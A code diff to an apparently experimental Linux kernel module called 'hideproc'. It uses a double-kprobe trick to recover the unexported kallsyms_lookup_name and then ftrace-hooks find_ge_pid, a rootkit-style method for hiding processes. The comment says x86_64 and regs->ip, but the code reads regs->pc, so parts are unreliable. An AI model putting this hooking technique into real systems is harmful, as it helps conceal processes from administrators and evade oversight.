@@ -1,9 +1,105 @@
+/*llsyms_lookup_name undefined and finding not exported functions in the linux kernel
+*
+* zizzu 2020
+*
+* On kernels 5.7+ kallsyms_lookup_name is not exported anymore, so it is not usable in kernel modules.
+* The address of this function is visible via /proc/kallsyms
+* but since the address is randomized on reboot, hardcoding a value is not possible.
+* A kprobe replaces the first instruction of a kernel function
+* and saves cpu registers into a struct pt_regs *regs and then a handler
+* function is executed with that struct as parameter.
+* The saved value of the instruction pointer in regs->ip, is the address of probed function + 1.
+* A kprobe on kallsyms_lookup_name can read the address in the handler function.
+* Internally register_kprobe calls kallsyms_lookup_name, which is visible for this code, so,
+* planting a second kprobe, allow us to get the address of kallsyms_lookup_name without waiting
+* and then we can call this address via a function pointer, to use kallsyms_lookup_name in our module.
+*
+* example for _x86_64.
+*/
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/kprobes.h>
+
+#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)
+
+long unsigned int kln_addr = 0;
+unsigned long (*kln_pointer)(const char *name) = NULL;
+
+static struct kprobe kp0, kp1;
+
+KPROBE_PRE_HANDLER(handler_pre0)
+{
+  kln_addr = (regs->pc);
+  
+  return 0;
+}
+
+KPROBE_PRE_HANDLER(handler_pre1)
+{
+  return 0;
+}
+
+static int do_register_kprobe(struct kprobe *kp, char *symbol_name, void *handler)
+{
+  int ret;
+  
+  kp->symbol_name = symbol_name;
+  kp->pre_handler = handler;
+  
+  ret = register_kprobe(kp);
+  if (ret < 0) {
+    pr_err("register_probe() for symbol %s failed, returned %d\n", symbol_name, ret);
+    return ret;
+  }
+  
+  pr_info("Planted kprobe for symbol %s at %p\n", symbol_name, kp->addr);
+  
+  return ret;
+}
+
+static int m_init(void)
+{
+  int ret;
+  
+  pr_info("module loaded\n");
+  
+  ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
+  if (ret < 0)
+    return ret;
+ 
+  ret = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);
+  if (ret < 0) {
+    unregister_kprobe(&kp0);
+    return ret;
+  }
+  
+  unregister_kprobe(&kp0);
+  unregister_kprobe(&kp1);
+  
+  
+  kln_pointer = (unsigned long (*)(const char *name)) kln_addr;
+  
+  pr_info("kallsyms_lookup_name address = 0x%lx\n", kln_pointer("kallsyms_lookup_name"));
+  
+  return 0;
+}
+
+static void m_exit(void)
+{
+  pr_info("module unloaded\n");
+}
+
+
+
+
 #include <linux/cdev.h>
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
+#include <linux/kprobes.h>
 
 #define DEBUG
 
@@ -15,23 +111,23 @@ enum RETURN_CODE { SUCCESS };
 
 struct ftrace_hook {
     const char *name;
-    void *func, *orig;
-    unsigned long address;
+    void *func, **pp_orig;
     struct ftrace_ops ops;
 };
 
 static int hook_resolve_addr(struct ftrace_hook *hook)
 {
 
-    hook->address = kallsyms_lookup_name(hook->name);
+    *(hook->pp_orig) = kln_pointer(hook->name);
 
-    if (!hook->address) {
+    if (!*hook->pp_orig) {
         printk("unresolved symbol: %s\n", hook->name);
         return -ENOENT;
     }
 
-    printk("kallsym symbol: %p\n", (void *)kallsyms_lookup_name(hook->name));
-      *((unsigned long *) hook->orig) = hook->address;
+    printk("%s:%d:%s resolved symbol:%s %p 0x%lx %px\n", __FILE__, __LINE__, __func__, 
+	   hook->name, 
+	   (void *)kln_pointer(hook->name),(void *)kln_pointer(hook->name), (void *)kln_pointer(hook->name));
     return 0;
 }
 
@@ -56,6 +152,8 @@ static int hook_install(struct ftrace_hook *hook)
                       FTRACE_OPS_FL_IPMODIFY;
 
 
+#if 1
+
     err = ftrace_set_filter(&hook->ops, "find_ge_pid", strlen("find_ge_pid"), 0);
     if (err) {
         printk("ftrace_set_filter() failed: %d\n", err);
@@ -63,6 +161,7 @@ static int hook_install(struct ftrace_hook *hook)
     } else {
 	    printk("successful \n");
 	}
+#endif
 
 #if 0
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 1);
@@ -75,7 +174,7 @@ static int hook_install(struct ftrace_hook *hook)
     err = register_ftrace_function(&hook->ops);
     if (err) {
         printk("register_ftrace_function() failed: %d\n", err);
-        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+        ftrace_set_filter_ip(&hook->ops, *hook->pp_orig, 1, 0);
         return err;
     }
     return 0;
@@ -128,10 +227,11 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 
 static void init_hook(void)
 {
-    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
     hook.name = "find_ge_pid";
     hook.func = hook_find_ge_pid;
-    hook.orig = &real_find_ge_pid;
+    hook.pp_orig = (void **)&real_find_ge_pid;
+    printk("%s:%s:%d %px %px %px\n", __FILE__, __func__, __LINE__, *hook.pp_orig,
+	   hook.pp_orig, real_find_ge_pid);
     hook_install(&hook);
 }
 
@@ -286,6 +386,11 @@ static int _hideproc_init(void)
 {
     int err;
     printk(KERN_INFO "@ %s\n", __func__);
+
+    if (m_init())
+	    return -1; 
+
+#if 1
     err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
     dev_major = MAJOR(dev);
 
@@ -295,9 +400,11 @@ static int _hideproc_init(void)
     cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
     device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                   DEVICE_NAME);
-
+#if 1
     init_hook();
+#endif
 
+#endif
     return 0;
 }
 
@@ -311,7 +418,16 @@ static void _hideproc_exit(void)
     //cdev_del(&dev);
     class_destroy(hideproc_class);
     unregister_chrdev(dev_major,DEVICE_NAME);
+
+    m_exit();
 }
 
 module_init(_hideproc_init);
 module_exit(_hideproc_exit);
+
+
+//#module_init(m_init);
+//#module_exit(m_exit);
+
+//MODULE_LICENSE("GPL");
+//MODULE_AUTHOR("zizzu");
